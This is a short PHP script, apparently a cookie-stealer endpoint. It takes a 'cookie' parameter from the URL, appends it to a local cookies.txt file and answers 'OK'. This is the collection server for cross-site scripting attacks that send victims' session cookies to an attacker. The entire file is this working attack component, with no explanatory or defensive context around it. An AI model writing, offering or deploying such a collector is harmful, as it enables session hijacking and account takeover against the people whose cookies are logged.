<?php

$data = $_GET["cookie"];

$file = fopen("cookies.txt", "a");

fwrite($file, $data . PHP_EOL);

fclose($file);

echo "OK";

?>
